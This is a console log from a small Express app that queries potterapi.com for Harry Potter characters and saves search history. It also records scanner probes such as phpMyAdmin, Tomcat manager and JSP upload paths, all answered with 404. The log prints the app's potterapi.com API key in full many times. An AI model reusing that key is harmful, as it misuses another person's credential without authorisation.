[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.540 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.595 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.638 ms - 1455[0m
[0mGET / [32m200 [0m0.644 ms - 1455[0m
[0mGET / [32m200 [0m1.097 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.668 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.632 ms - 1455[0m
[0mGET / [32m200 [0m3.639 ms - 1455[0m
[0mGET / [32m200 [0m1.063 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mPOST /phpmyadmin/index.php [33m404 [0m0.931 ms - 1637[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.632 ms - 1455[0m
[0mGET / [32m200 [0m0.611 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.586 ms - 1455[0m
[0mGET / [32m200 [0m0.631 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.541 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET / [32m200 [0m0.614 ms - 1455[0m
[0mGET / [32m200 [0m0.590 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m0.657 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.686 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.620 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.616 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.673 ms - 1455[0m
[0mGET / [32m200 [0m0.694 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.636 ms - 1455[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.751 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.598 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.637 ms - 1455[0m
[0mGET / [32m200 [0m0.616 ms - 1455[0m
[0mGET / [32m200 [0m1.062 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m1.100 ms - 1455[0m
[0mGET / [32m200 [0m0.563 ms - 1455[0m
[0mGET / [32m200 [0m0.613 ms - 1455[0m
[0mGET / [32m200 [0m0.649 ms - 1455[0m
[0mGET / [32m200 [0m6.027 ms - 1455[0m
[0mGET / [32m200 [0m0.590 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.636 ms - 1455[0m
[0mGET / [32m200 [0m0.549 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET / [32m200 [0m0.659 ms - 1455[0m
[0mGET / [32m200 [0m0.563 ms - 1455[0m
[0mGET / [32m200 [0m0.575 ms - 1455[0m
[0mGET http://95.179.131.215/judge/ [33m404 [0m0.890 ms - 1642[0m
[0mGET / [32m200 [0m0.575 ms - 1455[0m
[0mGET / [32m200 [0m0.582 ms - 1455[0m
[0mGET / [32m200 [0m0.581 ms - 1455[0m
[0mGET / [32m200 [0m0.608 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.637 ms - 1455[0m
[0mGET / [32m200 [0m0.637 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.542 ms - 1455[0m
[0mGET / [32m200 [0m0.586 ms - 1455[0m
[0mGET / [32m200 [0m0.482 ms - 1455[0m
[0mGET / [32m200 [0m0.596 ms - 1455[0m
[0mGET / [32m200 [0m0.561 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.858 ms - 1642[0m
[0mGET / [32m200 [0m0.545 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET /index.action [33m404 [0m0.821 ms - 1642[0m
[0mPOST /invoker/readonly [33m404 [0m2.096 ms - 1637[0m
[0mGET / [32m200 [0m1.156 ms - 1455[0m
[0mGET / [32m200 [0m0.563 ms - 1455[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET /script [33m404 [0m0.835 ms - 1642[0m
[0mGET / [32m200 [0m0.568 ms - 1455[0m
[0mGET / [32m200 [0m0.608 ms - 1455[0m
[0mGET / [32m200 [0m1.087 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.530 ms - 1455[0m
[0mGET / [32m200 [0m0.595 ms - 1455[0m
[0mGET / [32m200 [0m0.594 ms - 1455[0m
[0mGET / [32m200 [0m0.577 ms - 1455[0m
[0mGET http://5.188.210.12/echo.php [33m404 [0m2.006 ms - 1642[0m
[0mGET / [32m200 [0m1.088 ms - 1455[0m
[0mGET / [32m200 [0m0.642 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.573 ms - 1455[0m
[0mGET / [32m200 [0m0.582 ms - 1455[0m
[0mGET / [36m304 [0m0.483 ms - -[0m
[0mGET /harryStyles.css [32m200 [0m0.973 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.916 ms - 3853[0m
https://www.potterapi.com/v1/characters?name=Harry Potter!&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/Harry%20Potter! [32m200 [0m248.877 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry Potter!' }
{ _id: 5bfd7ab0e3d32b7d767756fa,
  characterName: 'Harry Potter!' }
{ _id: 5bfd7ab0e3d32b7d767756fa,
  characterName: 'Harry Potter!',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m4.675 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [32m200 [0m81.713 ms - 399[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bfd7ab2e3d32b7d767756fb, characterName: 'Harry Potter' }
{ _id: 5bfd7ab2e3d32b7d767756fb,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.348 ms - 2[0m
[0mGET /getHistory [32m200 [0m3.463 ms - 365[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.457 ms - 2[0m
collection removed
[0mGET /? [32m200 [0m0.598 ms - 1455[0m
[0mGET /harryStyles.css [36m304 [0m0.332 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.885 ms - -[0m
[0mGET /getHistory [32m200 [0m1.386 ms - 2[0m
https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/HarryPotter [32m200 [0m173.956 ms - 2[0m
in getHistory POST route
{ characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756fc,
  characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756fc,
  characterName: 'Harry Potter ',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m3.136 ms - 2[0m
https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[]
[0mGET /character/HarryPotter [36m304 [0m147.069 ms - -[0m
https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
in getHistory POST route
{ characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756fd,
  characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756fd,
  characterName: 'Harry Potter ',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m3.748 ms - 2[0m
[]
[0mGET /character/HarryPotter [36m304 [0m75.448 ms - -[0m
https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
in getHistory POST route
{ characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756fe,
  characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756fe,
  characterName: 'Harry Potter ',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.613 ms - 2[0m
[]
[0mGET /character/HarryPotter [36m304 [0m108.213 ms - -[0m
in getHistory POST route
{ characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756ff,
  characterName: 'Harry Potter ' }
{ _id: 5bfd7dbce3d32b7d767756ff,
  characterName: 'Harry Potter ',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m3.628 ms - 2[0m
[0mGET /getHistory [32m200 [0m3.337 ms - 301[0m
https://www.potterapi.com/v1/characters?name=Severus Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a1233bc0f5ae10021650d97',
    name: 'Severus Snape',
    role: 'Professor, Potions',
    house: 'Slytherin',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    patronus: 'doe',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: false,
    deathEater: true,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Severus%20Snape [32m200 [0m76.474 ms - 322[0m
in getHistory POST route
{ characterName: 'Severus Snape' }
{ _id: 5bfd7dc6e3d32b7d76775700,
  characterName: 'Severus Snape' }
{ _id: 5bfd7dc6e3d32b7d76775700,
  characterName: 'Severus Snape',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.347 ms - 2[0m
[0mGET /getHistory [32m200 [0m2.236 ms - 376[0m
In the DELETE route?
[0mPOST /delete [32m200 [0m0.376 ms - 2[0m
collection removed
[0mGET /? [36m304 [0m0.359 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.275 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.178 ms - -[0m
[0mGET /getHistory [32m200 [0m1.305 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a12292a0f5ae10021650d7e',
    name: 'Harry Potter',
    role: 'student',
    house: 'Gryffindor',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'The Boy Who Lived',
    wand: 'Holly, 11", phoenix feather',
    boggart: 'dementor',
    patronus: 'stag',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: true,
    dumbledoresArmy: true,
    deathEater: false,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Harry%20Potter [36m304 [0m102.533 ms - -[0m
in getHistory POST route
{ characterName: 'Harry Potter' }
{ _id: 5bfd7dd9e3d32b7d76775701, characterName: 'Harry Potter' }
{ _id: 5bfd7dd9e3d32b7d76775701,
  characterName: 'Harry Potter',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m6.267 ms - 2[0m
https://www.potterapi.com/v1/characters?name=Tom Riddle&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
[ { _id: '5a122c200f5ae10021650d88',
    name: 'Tom Riddle',
    house: 'Slytherin',
    school: 'Hogwarts School of Witchcraft and Wizardry',
    alias: 'Lord Voldemort',
    wand: 'Yew, 13 1/2", phoenix feather core',
    boggart: 'his own corpse',
    __v: 0,
    ministryOfMagic: false,
    orderOfThePhoenix: false,
    dumbledoresArmy: false,
    deathEater: true,
    bloodStatus: 'half-blood',
    species: 'human' } ]
[0mGET /character/Tom%20Riddle [32m200 [0m93.517 ms - 372[0m
in getHistory POST route
{ characterName: 'Tom Riddle' }
{ _id: 5bfd7de0e3d32b7d76775702, characterName: 'Tom Riddle' }
{ _id: 5bfd7de0e3d32b7d76775702,
  characterName: 'Tom Riddle',
  __v: 0 }
[0mPOST /getHistory [32m200 [0m2.672 ms - 2[0m
[0mGET /getHistory [32m200 [0m1.689 ms - 147[0m
[0mGET /? [32m200 [0m0.640 ms - 1455[0m
[0mGET /harryStyles.css [32m200 [0m0.471 ms - 467[0m
[0mGET /harryJS.js [32m200 [0m0.424 ms - 3853[0m
[0mGET /favicon.ico [33m404 [0m1.929 ms - 1642[0m
[0mGET /getHistory [36m304 [0m2.618 ms - -[0m
[0mGET / [32m200 [0m0.558 ms - 1455[0m
[0mGET / [32m200 [0m0.684 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.618 ms - 1455[0m
[0mGET / [32m200 [0m0.648 ms - 1455[0m
[0mGET /favicon.ico [33m404 [0m1.416 ms - 1642[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.551 ms - 1455[0m
[0mGET / [32m200 [0m0.566 ms - 1455[0m
[0mGET / [32m200 [0m0.622 ms - 1455[0m
[0mGET / [32m200 [0m0.647 ms - 1455[0m
[0mGET / [32m200 [0m0.560 ms - 1455[0m
[0mPUT /hbWDoIVBIu.jsp/ [33m404 [0m1.826 ms - 1637[0m
[0mHEAD /manager/html [33m404 [0m0.889 ms - 1642[0m
[0mGET / [32m200 [0m1.101 ms - 1455[0m
[0mGET / [32m200 [0m0.654 ms - 1455[0m
[0mGET /manager/html [33m404 [0m3.336 ms - 1642[0m
[0mGET /manager/html [33m404 [0m0.857 ms - 1642[0m
[0mGET / [32m200 [0m0.572 ms - 1455[0m
[0mGET / [32m200 [0m1.371 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.855 ms - 1642[0m
[0mGET / [32m200 [0m0.613 ms - 1455[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET / [32m200 [0m0.581 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.594 ms - 1455[0m
[0mGET /manager/html [33m404 [0m5.663 ms - 1642[0m
[0mGET / [32m200 [0m0.645 ms - 1455[0m
[0mGET / [32m200 [0m0.561 ms - 1455[0m
[0mGET / [32m200 [0m0.992 ms - 1455[0m
[0mGET / [32m200 [0m0.592 ms - 1455[0m
[0mGET / [32m200 [0m1.153 ms - 1455[0m
[0mGET / [32m200 [0m0.559 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.576 ms - 1455[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET / [32m200 [0m0.565 ms - 1455[0m
[0mGET / [32m200 [0m0.590 ms - 1455[0m
[0mGET / [32m200 [0m0.618 ms - 1455[0m
[0mGET / [32m200 [0m0.653 ms - 1455[0m
[0mGET / [32m200 [0m0.852 ms - 1455[0m
[0mGET / [32m200 [0m0.561 ms - 1455[0m
[0mGET / [32m200 [0m7.024 ms - 1455[0m
[0mGET / [32m200 [0m0.588 ms - 1455[0m
[0mGET / [32m200 [0m0.588 ms - 1455[0m
[0mGET / [32m200 [0m0.557 ms - 1455[0m
[0mGET / [32m200 [0m0.586 ms - 1455[0m
[0mGET / [32m200 [0m0.594 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.541 ms - 1455[0m
[0mGET / [32m200 [0m1.106 ms - 1455[0m
[0mGET / [32m200 [0m0.573 ms - 1455[0m
[0mGET / [32m200 [0m0.577 ms - 1455[0m
[0mGET / [32m200 [0m0.569 ms - 1455[0m
[0mGET / [32m200 [0m0.543 ms - 1455[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET / [32m200 [0m1.132 ms - 1455[0m
[0mGET / [32m200 [0m0.432 ms - 1455[0m
[0mGET / [32m200 [0m0.557 ms - 1455[0m
[0mGET / [32m200 [0m0.573 ms - 1455[0m
[0mGET / [32m200 [0m1.166 ms - 1455[0m
[0mGET / [32m200 [0m0.565 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.535 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m1.446 ms - 1455[0m
[0mGET / [32m200 [0m1.578 ms - 1455[0m
[0mGET /robots.txt [33m404 [0m4.039 ms - 1642[0m
[0mGET /sitemap.xml [33m404 [0m0.798 ms - 1642[0m
[0mGET /.well-known/security.txt [33m404 [0m0.850 ms - 1642[0m
[0mGET /favicon.ico [33m404 [0m0.792 ms - 1642[0m
[0mGET / [32m200 [0m0.628 ms - 1455[0m
[0mGET / [32m200 [0m0.649 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m0.615 ms - 1455[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET / [32m200 [0m0.641 ms - 1455[0m
[0mGET / [32m200 [0m0.564 ms - 1455[0m
[0mPOST /tmUnblock.cgi [33m404 [0m1.246 ms - 1637[0m
[0mGET / [32m200 [0m0.646 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.623 ms - 1455[0m
[0mGET / [32m200 [0m0.663 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m1.298 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET / [32m200 [0m0.614 ms - 1455[0m
[0mGET / [32m200 [0m0.652 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.559 ms - 1455[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET / [32m200 [0m3.251 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
